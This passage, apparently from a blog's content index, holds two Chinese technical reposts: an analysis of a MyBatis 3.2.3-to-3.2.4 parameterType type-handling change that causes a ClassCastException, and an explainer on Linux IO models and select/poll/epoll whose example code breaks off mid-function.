2。MyBatis要将SQL语句完整替换成带参数值的版本，需要经历框架初始化以及实际运行时动态替换这两个部分。因为MyBatis的代码非常多，接下来我们主要阐释和本次案例相关的内容。\n\n在框架初始化阶段，主要包括以下流程，如下图2所示：\n\n![图2 框架初始化流程](https://up-img.yonghong.tech/pic/2020/06/21-00-25-d54db22f4d28d90be1013fe3572cb09240056-Z9sc3D.png)\n\n图2 框架初始化流程\n\n\n\n在框架初始化阶段，有一些组件会被构建，逐一做个简单的介绍：\n\n- **SqlSession**：作为MyBatis工作的主要顶层API，表示和数据库交互的会话，完成必要的数据库增删改查功能。\n- **数据库增删改查功能**：负责根据用户传递的parameterObject，动态地生成SQL语句，将信息封装到BoundSql对象中，并返回。\n- **Configuration**：MyBatis所有的配置信息都维持在Configuration对象之中。\n\n接下来，我们主要关注SqlSource，这个类会负责生成SQL语句，这也是本次案例中，3.2.3和3.2.4差异比较大的一个地方。下面，我们会介绍一些源码。\n\n在构建Configuration的过程中，会涉及到构建对应每一条SQL语句对应的MappedStatement，parameterTypeClass就是根据我们在XML配置中写的parameterType转换而来，值为java.lang.String，在构建SqlSource时，传入这个参数。如下图3所示：\n\n![图3 SqlSource依赖参数](https://up-img.yonghong.tech/pic/2020/06/21-00-25-ce0a3c80a1a969401afb9eee6ceec7a3449700-b3UtsT.png)\n\n图3 SqlSource依赖参数\n\n\n\n在SqlSource的构建中，parameterType参数其实是被忽略不用的，并没有继续往下传递，这跟官方的描述是一致的。因为3.2.4之前这个parameterType属性被忽略了，然后就创建了DynamicSqlSource，这个类主要是用于处理MyBatis动态SQL的类。如下图4所示：\n\n![图4 SqlSource构建](https://up-img.yonghong.tech/pic/2020/06/21-00-25-52b982ff627457f57d190697ef38a883640529-ftNDJj.png)\n\n图4 SqlSource构建\n\n\n\n在框架初始化的阶段，需要介绍的内容，在3.2.3版本已经介绍完毕。当执行getStudentById方法时，MyBatis的流程如下图5所示。因受限于图片长度，我们对布局进行了一些调整：\n\n![图5 运行流程](https://up-img.yonghong.tech/pic/2020/06/21-00-25-fcf12b094fe418ca9696ac5885094fe034877-NUYC90.png)\n\n图5 运行流程\n\n\n\n在具体执行阶段，也涉及到一些组件，我们需要做简单的了解：\n\n- **SqlSession**：作为MyBatis工作的主要顶层API，表示和数据库交互的会话，完成必要数据库增删改查功能。\n- **Executor**：MyBatis执行器，这是MyBatis调度的核心，负责SQL语句的生成和查询缓存的维护。\n- **BoundSql**：表示动态生成的SQL语句以及相应的参数信息。\n- **StatementHandler**：封装了JDBC Statement操作，负责对JDBC statement的操作，如设置参数、将Statement结果集转换成List集合等等。\n- **ParameterHandler**：负责对用户传递的参数转换成JDBC Statement 所需要的参数。\n- **TypeHandler**：负责Java数据类型和JDBC数据类型之间的映射和转换。\n\n我们主要关注获取BoundSql以及参数化语句的流程，这也是3.2.3和3.2.4差异比较大的一个地方。在进入Executor的Query方法后，会首先通过对应的MappedStatement来获取BoundSql，用来帮助我们动态生成SQL语句，里面绑定了对应的SQL以及参数映射关系。在构建框架阶段，我们使用的SqlSource是DynamicSqlSource，通过这个类来生成获取BoundSql，如下图6所示：\n\n![图6 获取BoundSql](https://up-img.yonghong.tech/pic/2020/06/21-00-25-a333daae043824092d8fdf4867732822476964-8xsurz.png)\n\n图6 获取BoundSql\n\n\n\n通过图6的代码，我们可以得知，parameterType在初始化阶段未被使用，而是在SQL执行时获取到的，但获取到的类型是parameterObject对应的类型，这个类是用来记录Mapper方法上对应的参数。如下图7所示，它并非在SQL配置文件中标注的java.lang.String。\n\n![图7 parameterObject类型](https://up-img.yonghong.tech/pic/2020/06/21-00-25-016b41476d3306c2b0609aceed3c7d5a29377-LSD82q.png)\n\n图7 parameterObject类型\n\n\n\n然后我们通过SqlSourceBuilder的parse方法对SQL以及获取到的类型进行再次处理，其中的流程代码比较长。在这个过程中，我们主要去构建SQL的参数和Java类型的绑定关系，MyBatis依赖这个绑定关系，使用对应的TypeHandler去进行值的转换。\n\n调用链路是`SqlSourceParser.parse -> 内部类 ParameterMappingTokenHandler.handleToken -> 私有方法 buildParameterMapping`，如下图8中的代码所示。因为当前的parameterType为MapperMethod$ParamMap，经过了多个if判断，判定当前property id的propertyType为Object.class类型。接下来，构建SQL的参数和Java类型的绑定关系ParameterMapping，再进行返回。\n\n![图8 buildParameterMapping过程](https://up-img.yonghong.tech/pic/2020/06/21-00-25-4fc3e8c476ef995304001cbeb7c8364c727634-JdpGR9.png)\n\n图8 buildParameterMapping过程\n\n\n\n构建完成的ParameterMapping的结构如下图9中的代码所示，参数id对应的javaType类型为java.lang.Object，对应的TypeHander处理器为UnknownTypeHandler，也就是未找到合适的TypeHandler的兜底选项。\n\n![图9 ParameterMapping结构](https://up-img.yonghong.tech/pic/2020/06/21-00-25-0f563de7db302e7498f5c5d48b0f55ab108990-khF0An.png)\n\n图9 ParameterMapping结构\n\n\n\n接下来，流程就会流转到Executor，在`org.apache.ibatis.executor.SimpleExecutor#doQuery`进行查询时，会根据当前的SQL类型，生成对应的StatementHandler。因为我们目前都是用的预编译SQL，因此生成的statementHandler就是PreparedStatementHandler，熟悉JDBC的小伙伴应该马上可以猜到对应的语句是什么类型了。然后，我们对这句SQL语句进行填充，如下图10中的代码所示。我们会通过PreparedStatementHandler的parameterize方法对Statement进行参数化，也就是进行填充。\n\n![图10 PrepareStatement处理过程](https://up-img.yonghong.tech/pic/2020/06/21-00-25-53b0419dc111f5cb5785025707f173ab208427-Dagafq.png)\n\n图10 PrepareStatement处理过程\n\n\n\n在PreparedStatementHandler进行参数化时，会将参数化的职责交给DefaultParameterHandler处理。如下图11中的代码所示，我们主要关注红线部分，首先会获取ParameterMapping对应的TypeHander，如前文所述，获取到的是UnknownTypeHandler，然后会通过setParameter方法，将参数id替换成对应的值。\n\n![img](https://up-img.yonghong.tech/pic/2020/06/21-00-25-ad6d78ea99d4c1a96f492d13fef7416c214168-Qr2pDy.png)\n\n在Typehandler的流程里，首先会进入BaseTypeHandler，然后在具体设置时，会进入子类的方法。在UnknownTypeHandler，首先会再次对参数parameter进行解析，判断最正确的TypeHandler类型，如下图12中的代码所示:\n\n![图12 获取可用TypeHandler](https://up-img.yonghong.tech/pic/2020/06/21-00-25-fa15fda92d13ba0cd2a97df576dbf429428834-qs3lt3.png)\n\n图12 获取可用TypeHandler\n\n\n\n在resolveTypeHandler方法中，因为已知了参数值的类型，通过Integer这个class在typeHandlerRegistry中寻找对应的TypeHandler，TypeHandlerRegistry是MyBatis启动时内置好的，代表Java对象类型和TypeHandler的映射关系，有兴趣的同学可以进入这个类详细看下。在这个例子中，我们会直接获取到IntegerHandler，如下图13中的代码所示:\n\n![图13 获取IntegerHandler](https://up-img.yonghong.tech/pic/2020/06/21-00-25-b760df277efcda04462d2f94d168260b323127-6MHk67.png)\n\n图13 获取IntegerHandler\n\n\n\n在获取到IntegerHandler后，我们就可以使用IntegerTypeHandler的setInt方法，对SQL语句中的参数进行替换。如图14中的代码所示，SQL语句被成功替换：\n\n![图14 IntegerHander值替换](https://up-img.yonghong.tech/pic/2020/06/21-00-25-3e6163357375d436fada0b275f768b65110984-lUwt1L.png)\n\n图14 IntegerHander值替换\n\n\n\n后续就是执行SQL并处理返回结果，这就不在本文的讨论范围内了。从上文的分析中，我们可以了解到，在3.2.3及以下版本，MyBatis会忽略parameterType，在真正进行SQL转换时，重新根据SQL方法入参类型，然后计算合适的TypeHandler处理器，所以本案例中的代码在3.2.3版本时，它在运行时是正常的。\n\n### 以版本3.2.4为例，相比版本3.2.3，MyBatis构建SQL语句过程的变化分析\n\n在前一章节中，我们得知MyBatis在运行SQL阶段重新计算参数对应的TypeHandler，然后进行SQL参数的替换。那么，在版本3.2.4中，MyBatis做了什么改动，从而导致了原有的使用方式变得不可用呢？从官方的Release Log来看，版本3.2.4做了这样的一个改动。\n\n> This version builds the binding information during startup and the “parameterType” attribute is used\n\n这个意思是说：parameterType会在框架初始化阶段阶段就被使用到。我们将分析的重点放在构建阶段，因为负责处理绑定关系的BoundSql由配置阶段的SqlSource生成，我们主要查看SqlSource的构建，在3.2.4中发生了什么变化。如图15所示，与3.2.3不同，3.2.4首先判断了是否为动态SQL，在非动态SQL情况下，才会将parameterType java.lang.String作为参数，传入SqlSource的构造方法。\n\n![图15 生成SqlSource](https://up-img.yonghong.tech/pic/2020/06/21-00-25-1ef797f5581ce5bafd4b9019b0fbf1ea445131-jrGCbB.png)\n\n图15 生成SqlSource\n\n\n\n而后续流程与3.2.3一致，因为parameter类型为java.lang.String，在构建parameterMapping时，使用的类型就是java.lang.String。\n\n![图16 构建ParameterMapping与3.2.3版本的差异](https://up-img.yonghong.tech/pic/2020/06/21-00-25-5a8a8b2e65f82266ea0f0a77b6e12b34226089-Ca77s2.png)\n\n图16 构建ParameterMapping与3.2.3版本的差异\n\n\n\n因为在框架初始化阶段，SqlSource的ParameterMapping中id对应的类型就是java.lang.String，这就导致在进行SQL语句的替换时，获取到的TypeHandler是StringTypeHandler，如下图17所示：\n\n![图17  整数类型的参数获取到了StringTypeHandler](https://up-img.yonghong.tech/pic/2020/06/21-00-25-35b1a605bcaabb7aee2ef4de4378fa52637963-nyRxFf.png)\n\n图17 整数类型的参数获取到了StringTypeHandler\n\n\n\n后面的报错原因就比较好理解了，在调用StringTypeHandler的setString方法时，报出了`java.lang.ClassCastException: java.lang.Integer cannot be cast to java.lang.String`的错误。\n\n## 总结\n\n我们总结一下这个案例因：\n\nMyBatis 3.2.3版本支持parameterType和实际参数类型不匹配，在执行SQL阶段，动态计算值处理器类型。在大版本升级2个版本号后，parameterType实际的类型开始生效，使用对应这个类型的TypeHandler对SQL进行参数替换，会导致Mapper方法中的参数和XML中的parameterType不匹配时，进而会出现类型转换报错。\n\n这一段排查的经历，对自己后续编写代码及在系统上线时也有一些启发，主要包括以下几个方面：\n\n- 在inf-bom升级时，需要线下进行全面回归，要避免框架存在不兼容的用法，不然的话，就容易导致线上错误。\n- 开发同学可以检查自己系统内的MyBatis版本，如果是3.2.4以下，需要全面检查下现在的Mapper文件里对于parameterType的使用和Mapper方法中实际的参数类型是否一致，避免升级到3.2.4及以上版本时发生转型报错。如果有不匹配的情况存在，需要进行修正或者不使用parameterType，让MyBatis在运行SQL时自动计算对应的类型。\n- 可以考虑使用MyBatis-Generator来自动生成XML和Mapper文件，毕竟是专业团队在维护，稳定性相对来说会更好一些，同时能够避免手动修改XML文件带来的误操作。\n- 可以主动关注强依赖的一些开源框架的Release Log，不要错过了重要的信息。\n\n## 参考资料\n\n- [带你一步一步手撕 MyBatis 源码加手绘流程图——构建部分](https://juejin.im/post/5db92c41f265da4d0a68d161)\n- [带你一步一步手撕 MyBatis 源码加手绘流程图——执行部分](https://juejin.im/post/5dbe35286fb9a0205d562942)\n- [MyBatis源码解析（三）—缓存篇](https://juejin.im/post/5e5355f76fb9a07cd00d8066)\n- [面试官问你MyBatis SQL是如何执行的？把这篇文章甩给他](https://juejin.im/post/5e350d895188254dfd43def5)\n- [源码分析(1.4万字) MyBatis接口没有实现类为什么可以执行增删改查](https://juejin.im/post/5e03f7d5e51d45583615ab3e)\n- [MyBatis/MyBatis-3/Comparing changes](https://github.com/mybatis/mybatis-3/compare/mybatis-3.2.3...mybatis-3.2.4#diff-788c1708d6225826f59c2344c9267f71)\n\n## 作者简介\n\n凯伦，2016年校招加入美团，后端开发工程师。","categories":["转载"],"tags":["MyBatis"]},{"title":"Linux IO模式及 select、poll、epoll详解","url":"/repost/2020/select-poll-epoll/","content":"\n> FROM [https://segmentfault.com/a/1190000003063859](https://segmentfault.com/a/1190000003063859)\n\n> 注：本文是对众多博客的学习和总结，可能存在理解错误。请带着怀疑的眼光，同时如果有错误希望能指出。\n\n同步IO和异步IO，阻塞IO和非阻塞IO分别是什么，到底有什么区别？不同的人在不同的上下文下给出的答案是不同的。所以先限定一下本文的上下文。\n\n```\n本文讨论的背景是Linux环境下的network IO。\n```\n\n<!--more-->\n\n# 一 概念说明\n\n在进行解释之前，首先要说明几个概念：\n- 用户空间和内核空间\n- 进程切换\n- 进程的阻塞\n- 文件描述符\n- 缓存 I/O\n\n## 用户空间与内核空间\n\n现在操作系统都是采用虚拟存储器，那么对32位操作系统而言，它的寻址空间（虚拟存储空间）为4G（2的32次方）。操作系统的核心是内核，独立于普通的应用程序，可以访问受保护的内存空间，也有访问底层硬件设备的所有权限。为了保证用户进程不能直接操作内核（kernel），保证内核的安全，操心系统将虚拟空间划分为两部分，一部分为内核空间，一部分为用户空间。针对linux操作系统而言，将最高的1G字节（从虚拟地址0xC0000000到0xFFFFFFFF），供内核使用，称为内核空间，而将较低的3G字节（从虚拟地址0x00000000到0xBFFFFFFF），供各个进程使用，称为用户空间。\n\n## 进程切换\n\n为了控制进程的执行，内核必须有能力挂起正在CPU上运行的进程，并恢复以前挂起的某个进程的执行。这种行为被称为进程切换。因此可以说，任何进程都是在操作系统内核的支持下运行的，是与内核紧密相关的。\n\n从一个进程的运行转到另一个进程上运行，这个过程中经过下面这些变化：\n1. 保存处理机上下文，包括程序计数器和其他寄存器。\n2. 更新PCB信息。\n3. 把进程的PCB移入相应的队列，如就绪、在某事件阻塞等队列。\n4. 选择另一个进程执行，并更新其PCB。\n5. 更新内存管理的数据结构。\n6. 恢复处理机上下文。\n\n注：**总而言之就是很耗资源**，具体的可以参考这篇文章：[进程切换](http://guojing.me/linux-kernel-architecture/posts/process-switch/)\n\n## 进程的阻塞\n\n正在执行的进程，由于期待的某些事件未发生，如请求系统资源失败、等待某种操作的完成、新数据尚未到达或无新工作做等，则由系统自动执行阻塞原语(Block)，使自己由运行状态变为阻塞状态。可见，进程的阻塞是进程自身的一种主动行为，也因此只有处于运行态的进程（获得CPU），才可能将其转为阻塞状态。`当进程进入阻塞状态，是不占用CPU资源的`。\n\n## 文件描述符fd\n\n文件描述符（File descriptor）是计算机科学中的一个术语，是一个用于表述指向文件的引用的抽象化概念。\n\n文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。但是文件描述符这一概念往往只适用于UNIX、Linux这样的操作系统。\n\n## 缓存 I/O\n\n缓存 I/O 又被称作标准 I/O，大多数文件系统的默认 I/O 操作都是缓存 I/O。在 Linux 的缓存 I/O 机制中，操作系统会将 I/O 的数据缓存在文件系统的页缓存（ page cache ）中，也就是说，数据会先被拷贝到操作系统内核的缓冲区中，然后才会从操作系统内核的缓冲区拷贝到应用程序的地址空间。\n\n**缓存 I/O 的缺点：**\n数据在传输过程中需要在应用程序地址空间和内核进行多次数据拷贝操作，这些数据拷贝操作所带来的 CPU 以及内存开销是非常大的。\n\n# 二 IO模式\n\n刚才说了，对于一次IO访问（以read举例），数据会先被拷贝到操作系统内核的缓冲区中，然后才会从操作系统内核的缓冲区拷贝到应用程序的地址空间。所以说，当一个read操作发生时，它会经历两个阶段：\n1. 等待数据准备 (Waiting for the data to be ready)\n2. 将数据从内核拷贝到进程中 (Copying the data from the kernel to the process)\n\n正式因为这两个阶段，linux系统产生了下面五种网络模式的方案。\n- 阻塞 I/O（blocking IO）\n- 非阻塞 I/O（nonblocking IO）\n- I/O 多路复用（ IO multiplexing）\n- 信号驱动 I/O（ signal driven IO）\n- 异步 I/O（asynchronous IO）\n\n注：由于signal driven IO在实际中并不常用，所以我这只提及剩下的四种IO Model。\n\n## 阻塞 I/O（blocking IO）\n\n在linux中，默认情况下所有的socket都是blocking，一个典型的读操作流程大概是这样：\n![clipboard.png](https://up-img.yonghong.tech/pic/2020/06/22-09-36-bVm1c3-niGW4J.png)\n\n当用户进程调用了recvfrom这个系统调用，kernel就开始了IO的第一个阶段：准备数据（对于网络IO来说，很多时候数据在一开始还没有到达。比如，还没有收到一个完整的UDP包。这个时候kernel就要等待足够的数据到来）。这个过程需要等待，也就是说数据被拷贝到操作系统内核的缓冲区中是需要一个过程的。而在用户进程这边，整个进程会被阻塞（当然，是进程自己选择的阻塞）。当kernel一直等到数据准备好了，它就会将数据从kernel中拷贝到用户内存，然后kernel返回结果，用户进程才解除block的状态，重新运行起来。\n\n> 所以，blocking IO的特点就是在IO执行的两个阶段都被block了。\n\n## 非阻塞 I/O（nonblocking IO）\n\nlinux下，可以通过设置socket使其变为non-blocking。当对一个non-blocking socket执行读操作时，流程是这个样子：\n![clipboard.png](https://up-img.yonghong.tech/pic/2020/06/22-09-36-bVm1c4-ZP8Z38.png)\n\n当用户进程发出read操作时，如果kernel中的数据还没有准备好，那么它并不会block用户进程，而是立刻返回一个error。从用户进程角度讲 ，它发起一个read操作后，并不需要等待，而是马上就得到了一个结果。用户进程判断结果是一个error时，它就知道数据还没有准备好，于是它可以再次发送read操作。一旦kernel中的数据准备好了，并且又再次收到了用户进程的system call，那么它马上就将数据拷贝到了用户内存，然后返回。\n\n> 所以，nonblocking IO的特点是用户进程需要**不断的主动询问**kernel数据好了没有。\n\n## I/O 多路复用（ IO multiplexing）\n\nIO multiplexing就是我们说的select，poll，epoll，有些地方也称这种IO方式为event driven IO。select/epoll的好处就在于单个process就可以同时处理多个网络连接的IO。它的基本原理就是select，poll，epoll这个function会不断的轮询所负责的所有socket，当某个socket有数据到达了，就通知用户进程。\n\n![clipboard.png](https://up-img.yonghong.tech/pic/2020/06/22-09-36-bVm1c5-yqnIEw.png)\n\n`当用户进程调用了select，那么整个进程会被block`，而同时，kernel会“监视”所有select负责的socket，当任何一个socket中的数据准备好了，select就会返回。这个时候用户进程再调用read操作，将数据从kernel拷贝到用户进程。\n\n> 所以，I/O 多路复用的特点是通过一种机制一个进程能同时等待多个文件描述符，而这些文件描述符（套接字描述符）其中的任意一个进入读就绪状态，select()函数就可以返回。\n\n这个图和blocking IO的图其实并没有太大的不同，事实上，还更差一些。因为这里需要使用两个system call (select 和 recvfrom)，而blocking IO只调用了一个system call (recvfrom)。但是，用select的优势在于它可以同时处理多个connection。\n\n所以，如果处理的连接数不是很高的话，使用select/epoll的web server不一定比使用multi-threading + blocking IO的web server性能更好，可能延迟还更大。select/epoll的优势并不是对于单个连接能处理得更快，而是在于能处理更多的连接。）\n\n在IO multiplexing Model中，实际中，对于每一个socket，一般都设置成为non-blocking，但是，如上图所示，整个用户的process其实是一直被block的。只不过process是被select这个函数block，而不是被socket IO给block。\n\n## 异步 I/O（asynchronous IO）\n\ninux下的asynchronous IO其实用得很少。先看一下它的流程：\n![clipboard.png](https://up-img.yonghong.tech/pic/2020/06/22-09-36-bVm1c8-hBoNvC.png)\n\n用户进程发起read操作之后，立刻就可以开始去做其它的事。而另一方面，从kernel的角度，当它受到一个asynchronous read之后，首先它会立刻返回，所以不会对用户进程产生任何block。然后，kernel会等待数据准备完成，然后将数据拷贝到用户内存，当这一切都完成之后，kernel会给用户进程发送一个signal，告诉它read操作完成了。\n\n## 总结\n\n### blocking和non-blocking的区别\n\n调用blocking IO会一直block住对应的进程直到操作完成，而non-blocking IO在kernel还准备数据的情况下会立刻返回。\n\n### synchronous IO和asynchronous IO的区别\n\n在说明synchronous IO和asynchronous IO的区别之前，需要先给出两者的定义。POSIX的定义是这样子的：\n- A synchronous I/O operation causes the requesting process to be blocked until that I/O operation completes;\n- An asynchronous I/O operation does not cause the requesting process to be blocked;\n\n两者的区别就在于synchronous IO做”IO operation”的时候会将process阻塞。按照这个定义，之前所述的blocking IO，non-blocking IO，IO multiplexing都属于synchronous IO。\n\n有人会说，non-blocking IO并没有被block啊。这里有个非常“狡猾”的地方，定义中所指的”IO operation”是指真实的IO操作，就是例子中的recvfrom这个system call。non-blocking IO在执行recvfrom这个system call的时候，如果kernel的数据没有准备好，这时候不会block进程。但是，当kernel中数据准备好的时候，recvfrom会将数据从kernel拷贝到用户内存中，这个时候进程是被block了，在这段时间内，进程是被block的。\n\n而asynchronous IO则不一样，当进程发起IO 操作之后，就直接返回再也不理睬了，直到kernel发送一个信号，告诉进程说IO完成。在这整个过程中，进程完全没有被block。\n\n**各个IO Model的比较如图所示：**\n\n![clipboard.png](https://up-img.yonghong.tech/pic/2020/06/22-09-36-bVm1c9-cXyHlR.png)\n\n通过上面的图片，可以发现non-blocking IO和asynchronous IO的区别还是很明显的。在non-blocking IO中，虽然进程大部分时间都不会被block，但是它仍然要求进程去主动的check，并且当数据准备完成以后，也需要进程主动的再次调用recvfrom来将数据拷贝到用户内存。而asynchronous IO则完全不同。它就像是用户进程将整个IO操作交给了他人（kernel）完成，然后他人做完后发信号通知。在此期间，用户进程不需要去检查IO操作的状态，也不需要主动的去拷贝数据。\n\n# 三 I/O 多路复用之select、poll、epoll详解\n\nselect，poll，epoll都是IO多路复用的机制。I/O多路复用就是通过一种机制，一个进程可以监视多个描述符，一旦某个描述符就绪（一般是读就绪或者写就绪），能够通知程序进行相应的读写操作。但select，poll，epoll本质上都是同步I/O，因为他们都需要在读写事件就绪后自己负责进行读写，也就是说这个读写过程是阻塞的，而异步I/O则无需自己负责进行读写，异步I/O的实现会负责把数据从内核拷贝到用户空间。（这里啰嗦下）\n\n## select\n\n```\nint select (int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);\n```\n\nselect 函数监视的文件描述符分3类，分别是writefds、readfds、和exceptfds。调用后select函数会阻塞，直到有描述副就绪（有数据 可读、可写、或者有except），或者超时（timeout指定等待时间，如果立即返回设为null即可），函数返回。当select函数返回后，可以 通过遍历fdset，来找到就绪的描述符。\n\nselect目前几乎在所有的平台上支持，其良好跨平台支持也是它的一个优点。select的一 个缺点在于单个进程能够监视的文件描述符的数量存在最大限制，在Linux上一般为1024，可以通过修改宏定义甚至重新编译内核的方式提升这一限制，但 是这样也会造成效率的降低。\n\n## poll\n\n```\nint poll (struct pollfd *fds, unsigned int nfds, int timeout);\n```\n\n不同与select使用三个位图来表示三个fdset的方式，poll使用一个 pollfd的指针实现。\n\n```\nstruct pollfd {\n    int fd; /* file descriptor */\n    short events; /* requested events to watch */\n    short revents; /* returned events witnessed */\n};\n```\n\npollfd结构包含了要监视的event和发生的event，不再使用select“参数-值”传递的方式。同时，pollfd并没有最大数量限制（但是数量过大后性能也是会下降）。 和select函数一样，poll返回后，需要轮询pollfd来获取就绪的描述符。\n\n> 从上面看，select和poll都需要在返回后，`通过遍历文件描述符来获取已经就绪的socket`。事实上，同时连接的大量客户端在一时刻可能只有很少的处于就绪状态，因此随着监视的描述符数量的增长，其效率也会线性下降。\n\n## epoll\n\nepoll是在2.6内核中提出的，是之前的select和poll的增强版本。相对于select和poll来说，epoll更加灵活，没有描述符限制。epoll使用一个文件描述符管理多个描述符，将用户关系的文件描述符的事件存放到内核的一个事件表中，这样在用户空间和内核空间的copy只需一次。\n\n### 一 epoll操作过程\n\nepoll操作过程需要三个接口，分别如下：\n\n```\nint epoll_create(int size)；//创建一个epoll的句柄，size用来告诉内核这个监听的数目一共有多大\nint epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；\nint epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);\n```\n\n**1. int epoll_create(int size);**\n创建一个epoll的句柄，size用来告诉内核这个监听的数目一共有多大，这个参数不同于select()中的第一个参数，给出最大监听的fd+1的值，`参数size并不是限制了epoll所能监听的描述符最大个数，只是对内核初始分配内部数据结构的一个建议`。\n当创建好epoll句柄后，它就会占用一个fd值，在linux下如果查看/proc/进程id/fd/，是能够看到这个fd的，所以在使用完epoll后，必须调用close()关闭，否则可能导致fd被耗尽。\n\n**2. int epoll_ctl(int epfd, int op, int fd, struct epoll_event \\*event)；**\n函数是对指定描述符fd执行op操作。\n- epfd：是epoll_create()的返回值。\n- op：表示op操作，用三个宏来表示：添加EPOLL_CTL_ADD，删除EPOLL_CTL_DEL，修改EPOLL_CTL_MOD。分别添加、删除和修改对fd的监听事件。\n- fd：是需要监听的fd（文件描述符）\n- epoll_event：是告诉内核需要监听什么事，struct epoll_event结构如下：\n\n```\nstruct epoll_event {\n  __uint32_t events;  /* Epoll events */\n  epoll_data_t data;  /* User data variable */\n};\n\n//events可以是以下几个宏的集合：\nEPOLLIN ：表示对应的文件描述符可以读（包括对端SOCKET正常关闭）；\nEPOLLOUT：表示对应的文件描述符可以写；\nEPOLLPRI：表示对应的文件描述符有紧急的数据可读（这里应该表示有带外数据到来）；\nEPOLLERR：表示对应的文件描述符发生错误；\nEPOLLHUP：表示对应的文件描述符被挂断；\nEPOLLET： 将EPOLL设为边缘触发(Edge Triggered)模式，这是相对于水平触发(Level Triggered)来说的。\nEPOLLONESHOT：只监听一次事件，当监听完这次事件之后，如果还需要继续监听这个socket的话，需要再次把这个socket加入到EPOLL队列里\n```\n\n**3. int epoll_wait(int epfd, struct epoll_event \\* events, int maxevents, int timeout);**\n等待epfd上的io事件，最多返回maxevents个事件。\n参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个maxevents的值不能大于创建epoll_create()时的size，参数timeout是超时时间（毫秒，0会立即返回，-1将不确定，也有说法说是永久阻塞）。该函数返回需要处理的事件数目，如返回0表示已超时。\n\n### 二 工作模式\n\n　epoll对文件描述符的操作有两种模式：**LT（level trigger）**和**ET（edge trigger）**。LT模式是默认模式，LT模式与ET模式的区别如下：\n　　**LT模式**：当epoll_wait检测到描述符事件发生并将此事件通知应用程序，`应用程序可以不立即处理该事件`。下次调用epoll_wait时，会再次响应应用程序并通知此事件。\n　　**ET模式**：当epoll_wait检测到描述符事件发生并将此事件通知应用程序，`应用程序必须立即处理该事件`。如果不处理，下次调用epoll_wait时，不会再次响应应用程序并通知此事件。\n\n#### 1. LT模式\n\nLT(level triggered)是缺省的工作方式，并且同时支持block和no-block socket.在这种做法中，内核告诉你一个文件描述符是否就绪了，然后你可以对这个就绪的fd进行IO操作。如果你不作任何操作，内核还是会继续通知你的。\n\n#### 2. ET模式\n\nET(edge-triggered)是高速工作方式，只支持no-block socket。在这种模式下，当描述符从未就绪变为就绪时，内核通过epoll告诉你。然后它会假设你知道文件描述符已经就绪，并且不会再为那个文件描述符发送更多的就绪通知，直到你做了某些操作导致那个文件描述符不再为就绪状态了(比如，你在发送，接收或者接收请求，或者发送接收的数据少于一定量时导致了一个EWOULDBLOCK 错误）。但是请注意，如果一直不对这个fd作IO操作(从而导致它再次变成未就绪)，内核不会发送更多的通知(only once)\n\nET模式在很大程度上减少了epoll事件被重复触发的次数，因此效率要比LT模式高。epoll工作在ET模式的时候，必须使用非阻塞套接口，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。\n\n#### 3. 总结\n\n**假如有这样一个例子：**\n1. 我们已经把一个用来从管道中读取数据的文件句柄(RFD)添加到epoll描述符\n2. 这个时候从管道的另一端被写入了2KB的数据\n3. 调用epoll_wait(2)，并且它会返回RFD，说明它已经准备好读取操作\n4. 然后我们读取了1KB的数据\n5. 调用epoll_wait(2)......\n\n**LT模式：**\n如果是LT模式，那么在第5步调用epoll_wait(2)之后，仍然能受到通知。\n\n**ET模式：**\n如果我们在第1步将RFD添加到epoll描述符的时候使用了EPOLLET标志，那么在第5步调用epoll_wait(2)之后将有可能会挂起，因为剩余的数据还存在于文件的输入缓冲区内，而且数据发出端还在等待一个针对已经发出数据的反馈信息。只有在监视的文件句柄上发生了某个事件的时候 ET 工作模式才会汇报事件。因此在第5步的时候，调用者可能会放弃等待仍在存在于文件输入缓冲区内的剩余数据。\n\n当使用epoll的ET模型来工作时，当产生了一个EPOLLIN事件后，\n读数据的时候需要考虑的是当recv()返回的大小如果等于请求的大小，那么很有可能是缓冲区还有数据未读完，也意味着该次事件还没有处理完，所以还需要再次读取：\n\n```\nwhile(rs){\n  buflen = recv(activeevents[i].data.fd, buf, sizeof(buf), 0);\n  if(buflen < 0){\n    // 由于是非阻塞的模式,所以当errno为EAGAIN时,表示当前缓冲区已无数据可读\n    // 在这里就当作是该次事件已处理处.\n    if(errno == EAGAIN){\n        break;\n    }\n    else{\n        return;\n    }\n  }\n  else if(buflen == 0){\n     // 这里表示对端的socket已正常关闭.\n  }\n\n if(buflen == sizeof(buf){\n      rs = 1;   // 需要再次读取\n }\n else{\n      rs = 0;\n }\n}\n```\n\n> **Linux中的EAGAIN含义**\n\nLinux环境下开发经常会碰到很多错误(设置errno)，其中EAGAIN是其中比较常见的一个错误(比如用在非阻塞操作中)。\n从字面上来看，是提示再试一次。这个错误经常出现在当应用程序进行一些非阻塞(non-blocking)操作(对文件或socket)的时候。\n\n例如，以 O_NONBLOCK的标志打开文件/socket/FIFO，如果你连续做read操作而没有数据可读。此时程序不会阻塞起来等待数据准备就绪返回，read函数会返回一个错误EAGAIN，提示你的应用程序现在没有数据可读请稍后再试。\n又例如，当一个系统调用(比如fork)因为没有足够的资源(比如虚拟内存)而执行失败，返回EAGAIN提示其再调用一次(也许下次就能成功)。\n\n### 三 代码演示\n\n下面是一段不完整的代码且格式不对，意在表述上面的过程，去掉了一些模板代码。\n\n```\n#define IPADDRESS   \"127.0.0.1\"\n#define PORT        8787\n#define MAXSIZE     1024\n#define LISTENQ     5\n#define FDSIZE      1000\n#define EPOLLEVENTS 100\n\nlistenfd = socket_bind(IPADDRESS,PORT);\n\nstruct epoll_event events[EPOLLEVENTS];\n\n//创建一个描述符\nepollfd = epoll_create(FDSIZE);\n\n//添加监听描述符事件\nadd_event(epollfd,listenfd,EPOLLIN);\n\n//循环等待\nfor ( ; ; ){\n    //该函数返回已经准备好的描述符事件数目\n    ret = epoll_wait(epollfd,events,EPOLLEVENTS,-1);\n    //处理接收到的连接\n    handle_events(epollfd,events,ret,listenfd,buf);\n}\n\n//事件处理函数\nstatic void handle_events(int epollfd,struct epoll_event *events,int num,int listenfd,char *buf)\n{\n     int i;\n     int fd;\n     